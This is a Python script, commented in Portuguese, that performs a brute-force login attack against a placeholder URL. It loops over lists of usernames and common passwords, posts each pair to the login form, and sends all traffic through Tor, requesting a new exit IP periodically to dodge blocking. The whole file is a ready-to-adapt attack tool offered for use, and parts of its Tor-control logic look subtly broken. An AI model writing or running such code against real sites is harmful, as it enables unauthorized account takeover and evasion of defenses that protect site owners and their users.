import requests
import socks
import socket
import time

# Configurar proxy para usar o Tor
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# URL do alvo (substitua pela URL real)
url = "http://seusite.com/login"

# Arquivos de usuários e senhas (substitua pelos seus)
usuarios = ["admin", "user", "root"]
senhas = ["123456", "password", "admin123", "root", "senha123"]

# Função para mudar IP através do Tor
def mudar_ip_tor():
    with open("/var/run/tor/control.authcookie", "rb") as f:
        cookie = f.read()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9051))
    s.sendall(b'AUTHENTICATE "' + cookie + b'"\r\nSIGNAL NEWNYM\r\n')
    s.close()
    time.sleep(5)  # Espera para o IP ser alterado

# Função para realizar ataque de força bruta
def brute_force():
    for user in usuarios:
        for senha in senhas:
            dados = {"username": user, "password": senha}
            response = requests.post(url, data=dados)
            
            if "Login bem-sucedido" in response.text:  # Ajuste conforme a resposta do site
                print(f"[+] Login encontrado: {user}:{senha}")
                return
            
            print(f"[-] Tentativa falhou: {user}:{senha}")

            # Muda IP a cada 5 tentativas
            if senhas.index(senha) % 5 == 0:
                mudar_ip_tor()

brute_force()

